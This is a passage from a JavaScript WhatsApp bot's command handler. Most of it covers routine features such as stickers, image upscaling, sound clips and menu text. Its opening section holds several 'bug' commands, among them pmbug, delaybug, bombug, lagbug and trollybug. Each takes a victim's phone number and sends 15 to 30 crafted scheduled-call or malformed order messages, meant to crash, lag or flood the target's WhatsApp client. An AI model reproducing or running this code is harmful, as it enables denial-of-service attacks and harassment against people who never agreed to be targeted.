if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return newReply(mess.prem)
 if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
if (args.length < 1) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = textbug2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
ndaa.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return newReply(mess.prem)
if (!args[0]) return newReply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "916909137213@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
ndaa.relayMessage(victim, order.message, { messageId: order.key.id })
}
newReply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
           /* ~~~~~~~~~ CONVERT ~~~~~~~~~ */
           case 'style': case 'styletext': {
        let { styletext } = require('./lib/scraper.js')
        if (!text) return newReply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `*${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
        }
        break
            case 'btc':
            case 'botcomment': {
            if (!q) return newReply('Example: Haloo!')
            newReply(mess.wait)
            ndaa.sendMessage(m.chat, { image: { url: `https://api.zahwazein.xyz/creator/botcomment?text=${q}&apikey=${zenz}` }, caption: `Image Bot Comment\nCreated By Ndaa` }, {quoted: ftroli})
            }
            break
            case 'ytc':
            case 'ytcomment': {
            if (!text) return newReply(`Cara penggunaan:\n${prefix + command} [Username]|[Comment]\n\nContoh:\n${prefix + command} Ndaa|Halo, Mau Buy Script?`)
            let [Username, Comment] = text.split("|")
            if (!Username) return newReply(`Masukkan nama akun`)
            if (!Comment) return newReply(`Masukkan comment`)
            newReply(mess.wait)
            ndaa.sendMessage(m.chat, { image: { url: `https://api.zahwazein.xyz/creator/ytcomment?url=https://i.ibb.co/9Vz4t6Y/766cf68698c15e78a5bff139a213bff1.jpg&text=${Comment}&text2=${Username}&apikey=${zenz}` }, caption: `Created By Ndaa\nType: ${command}`}, { quoted: ftroli })
            }
            break
            case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
                if (!q) return newReply('Masukan Text')
                let ppnyauser = await await ndaa.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(q, pushname, ppnyauser)
                newReply(mess.wait)
                ndaa.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
            case 'ttp':
                if (!q) return newReply('Masukan Text')
                newReply(mess.wait)
                ndaa.sendMessage(m.chat, {
                    sticker: {
                        url: `https://api.lolhuman.xyz/api/ttp?apikey=${lol}&text=${q}`
                    }
                }, {
                    quoted: ftroli
                })
                break
            case 'attp':
                if (!q) return newReply('Masukan Text')
                newReply(mess.wait)
                ndaa.sendMessage(m.chat, {
                    sticker: {
                        url: `https://api.lolhuman.xyz/api/attp?apikey=${lol}&text=${q}`
                    }
                }, {
                    quoted: ftroli
                })
                break

            case 'remini':
            case 'hd': {
                if (!isMedia) return newReply("Where The A Image")
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                ndaa.sendMessage(m.chat, {
                    image: {
                        url: `https://api.caliph.biz.id/api/upscale?img=${anu}&apikey=${caliph}`
                    },
                    caption: mess.done
                }, {
                    quoted: ftroli
                })
            }
            break
            case 'reminiv2':
case 'tohd': {
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await quoted.download()
let proses = await remini(media, "enhance");
ndaa.sendMessage(m.chat, { image: proses, caption: mess.done}, { quoted: m})
await sleep(5000)
}
break

            case 'removebg':
            case 'nobg': {
                if (!isMedia) return newReply("Where The A Image")
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let anu = await TelegraPh(media)
                ndaa.sendMessage(m.chat, {
                    image: {
                        url: `https://api.caliph.biz.id/api/removebg?img=${anu}&apikey=${caliph}`
                    },
                    caption: mess.done
                }, {
                    quoted: ftroli
                })
            }
            break

            case 'tele':
            case 'telestick': {
                if (!isPremium) return newReply(mess.prem)
                if (!q) return newReply("Link?")
                let agg = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lol}&url=${q}`)
                for (var ki = 0; ki < agg.result.sticker.length; ki++) {
                    await ndaa.sendImageAsSticker(m.chat, agg.result.sticker[ki], m, {
                        packname: packname,
                        author: author
                    })
                }
            }
            break
            
            case 'whois': {
            if (!isPremium) return newReply(mess.prem)
            if (!text) return newReply(`Masukkan domain`);
            let whois_data = await axios.get(`https://whois.sanzy.xyz/api/whois/${text}`);
            let data = whois_data.data;
            let messageText = `*Whois ${text}*\n\n`;
            messageText += data;
            newReply(messageText);
            }
            break

            case 'ssweb':
            await loading()
            if (!q) return newReply(`Example: ${prefix + command} https://api.caliph.biz.id`)
            ndaa.sendMessage(m.chat, { image: { url: `https://api.caliph.biz.id/api/sshp?url=${q}&apikey=${caliph}`}, caption: `URL: ${q}`}, { quoted: ftroli })
            break
        
            case 'shortlink': {
            if (!isPremium) return newReply(mess.prem)
            await loading()
            if (args.length == 0) return newReply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
            let m = await fetchJson(`https://api.lolhuman.xyz/api/ouoshortlink?apikey=${lol}&url=${args[0]}`)
            newReply(m.result)
            }
            break
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
if (!isPremium) return newReply(mess.prem)
newReply(mess.wait)
Ndaa = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await ndaa.sendMessage(m.chat, { audio: Ndaa, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
            case 'menu':
            if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let ef = '```'
            let menu = `${ef}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${ef}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗟 𝗜 𝗦 𝗧 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴏᴡɴᴇʀᴍᴇɴᴜ
    ◦ .ʙᴜɢᴍᴇɴᴜ
    ◦ .ɢʀᴏᴜᴘᴍᴇɴᴜ
    ◦ .ᴀɴɪᴍᴇᴍᴇɴᴜ
    ◦ .ᴍᴀɪɴᴍᴇɴᴜ
    ◦ .ᴀsᴜᴘᴀɴᴍᴇɴᴜ
    ◦ .ɪɴғᴏʀᴍᴀᴛɪᴏɴ
    ◦ .ʀᴘɢᴍᴇɴᴜ
    ◦ .ᴘʀᴇᴍᴍᴇɴᴜ
    ◦ .ɪɴғᴏʀᴍᴀᴛɪᴏɴ
    ◦ .sᴛᴀʟᴋᴍᴇɴᴜ
    ◦ .ᴛᴇxᴛᴘʀᴏᴍᴇɴᴜ
    ◦ .ғᴜɴᴍᴇɴᴜ
    ◦ .ᴄᴏɴᴠᴇʀᴛᴍᴇɴᴜ
    ◦ .ᴅᴀᴛᴀᴍᴇɴᴜ
    ◦ .ɢᴀᴍᴇᴍᴇɴᴜ
    ◦ .ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ
    ◦ .ᴅᴏᴡɴᴍᴇɴᴜ
    ◦ .ᴏᴛʜᴇʀsᴍᴇɴᴜ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: menu,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'ownermenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let eff = '```'
            let own = `${eff}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${eff}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗢 𝗪 𝗡 𝗘 𝗥 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴅᴇʟsᴇsɪ
    ◦ .ʙᴄɢᴄ
    ◦ .ʙᴄɪᴍɢ
    ◦ .ʙᴄʜɪᴅᴇ
    ◦ .ᴊᴏɪɴ
    ◦ .ᴄᴇᴋɪᴅɢᴄ
    ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ
    ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ2
    ◦ .sᴇᴛɪᴍɢǫᴏᴜᴛᴇᴅ
    ◦ .sᴇᴛɪᴍɢᴍᴇɴᴜ
    ◦ .sᴇᴛᴠɪᴅᴍᴇɴᴜ
    ◦ .ᴄᴇᴋᴀᴘɪᴋᴇʏ
    ◦ .sʜᴜᴛᴅᴏᴡɴ 
    ◦ .ᴀᴜᴛᴏʀᴇᴀᴅ [ᴏᴘᴛɪᴏɴ]
    ◦ .ᴀᴜᴛᴏʙɪᴏ [ᴏᴘᴛɪᴏɴ]
    ◦ .ᴍᴏᴅᴇ [ᴏᴘᴛɪᴏɴ]
    ◦ .sᴇᴛᴡᴍ 
    ◦ .sᴇᴛʟɪɴᴋ
    ◦ .sᴇᴛᴘᴘʙᴏᴛ
    ◦ .ʙʟᴏᴄᴋ
    ◦ .ᴜɴʙʟᴏᴄᴋ 
    ◦ .ʙᴀᴄᴋᴜᴘ
    ◦ .ɢᴇᴛᴄᴀsᴇ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: own,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'groupmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let mon = '```'
            let gcm = `${mon}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${mon}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗚 𝗥 𝗢 𝗨 𝗣 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴄʟᴏsᴇᴛɪᴍᴇ
    ◦ .ᴏᴘᴇɴᴛɪᴍᴇ
    ◦ .ᴋɪᴄᴋ
    ◦ .ᴀᴅᴅ
    ◦ .ᴘʀᴏᴍᴏᴛᴇ
    ◦ .ᴅᴇᴍᴏᴛᴇ
    ◦ .sᴇᴛᴅᴇᴄs
    ◦ .sᴇᴛᴘᴘɢᴄ
    ◦ .ᴛᴀɢᴀʟʟ
    ◦ .ʜɪᴅᴇᴛᴀɢ
    ◦ .ᴛᴏᴛᴀɢ
    ◦ .ɢʀᴜᴏᴘ [ᴏᴘᴛɪᴏɴ]
    ◦ .ᴇᴅɪᴛɪɴғᴏ
    ◦ .ʟɪɴᴋɢᴄ
    ◦ .ʀᴇᴠᴏᴋᴇ
    ◦ .ʟɪsᴛᴏɴʟɪɴᴇ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: gcm,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'mainmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let monoos = '```'
            let txttt = `${monoos}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${monoos}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗠 𝗔 𝗜 𝗡 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ʙᴏᴛsᴛᴀᴛᴜs 
    ◦ .ʙᴜʏᴘʀᴇᴍɪᴜᴍ
    ◦ .sᴇᴡᴀʙᴏᴛ
    ◦ .sᴘᴇᴇᴅᴛᴇsᴛ
    ◦ .ʀᴜɴᴛɪᴍᴇ
    ◦ .sᴄʀɪᴘᴛ
    ◦ .ᴅᴏɴᴀᴛᴇ
    ◦ .ᴏᴡɴᴇʀ
    ◦ .ᴄᴀᴘɪ
    ◦ .ᴛǫᴛᴏ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: txttt,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'asupanmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let pep = '```'
            let asp = `${pep}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${pep}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗔 𝗦 𝗨 𝗣 𝗔 𝗡 - 𝗠 𝗘 𝗡 𝗨

    ◦  .ᴄᴇᴄᴀɴ
    ◦  .ᴄʜɪɴᴀ
    ◦  .ᴄᴏɢᴀɴ
    ◦  .ɪɴᴅᴏɴᴇsɪᴀ
    ◦  .ᴊᴀᴘᴀɴ
    ◦  .ᴋᴏʀᴇᴀ
    ◦  .ᴍᴀʟᴀʏsɪᴀ
    ◦  .ᴛʜᴀɪʟᴀɴᴅ
    ◦  .ᴠɪᴇᴛɴᴀᴍ

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: asp,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'rpgmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let haa = '```'
            let msgss = `${haa}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${haa}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗥 𝗣 𝗚 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ɪɴᴠᴇɴᴛᴏʀɪ
    ◦ .ᴘʀᴏғɪʟᴇ
    ◦ .ᴍɪɴɪɴɢ
    ◦ .ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ
    ◦ .ʙᴇʀʙᴜʀᴜ
    ◦ .ʜᴜɴᴛ
    ◦ .ʜᴇᴀʟ
    ◦ .ʙᴇʟɪ
    ◦ .ᴊᴜᴀʟ

*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: msgss,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'information': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let fk = '```'
            let tekst = `${fk}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${fk}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗜 𝗡 𝗙 𝗢 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ɪɴғᴏɢᴇᴍᴘᴀ
    ◦ .ʀᴀɴᴅᴏᴍᴘᴀɴᴛᴜɴ
    ◦ .ǫᴜᴏᴛᴇssᴇɴᴊᴀ
    ◦ .ɪɴғᴏᴄᴜᴀᴄᴀ
    ◦ .ᴡɪᴋɪᴘᴇᴅɪᴀ
    ◦ .ᴘɪɴᴛᴇʀᴇsᴛ
    ◦ .ᴍᴏᴛɪᴠᴀsɪ
    ◦ .ᴋʙʙɪ
    ◦ .ғᴀᴋᴛᴀᴜɴɪᴋ
    ◦ .ᴄᴇʀᴘᴇɴ
    
*sɪᴍᴘʟᴇ ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʙʏ ʜʏᴜᴜ*`
ndaa.sendMessage(m.chat, {
                        text: tekst,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: namabot,
                                body: `${namaowner}`,
                                thumbnail: fs.readFileSync('./media/menu.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: ftroli
                    })
                    break
case 'stalkmenu': 
if (!isRegistered) return newReply('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama.umur!*')
            await loading()
            let fff = '```'
            let eee = `${fff}Hi ${pushname} 👋\nSaya adalah sebuah sistem otomatis\n(WhatsApp Bot) yang dapat membantu untuk melakukan sesuatu, mencari dan mendapatkan data/informasi hanya melalui WhatsApp.${fff}

*乂 𝗜 𝗡 𝗙 𝗢 - 𝗕 𝗢 𝗧*

 ◦ *Bot Name* : ${namabot}
 ◦ *Total Fitur* : ${totalFitur()} Features
 ◦ *Library* : @WhiskeySockets/Baileys
 ◦ *Runtime* : ${runtime(process.uptime())}
 ◦ *Jam* : ${wib} WIB
 ◦ *Tanggal* : ${hariini}
${readmore}
乂 𝗦 𝗧 𝗔 𝗟 𝗞 - 𝗠 𝗘 𝗡 𝗨

    ◦ .ᴍʟsᴛᴀʟᴋ
    ◦ .ɪɢsᴛᴀʟᴋ
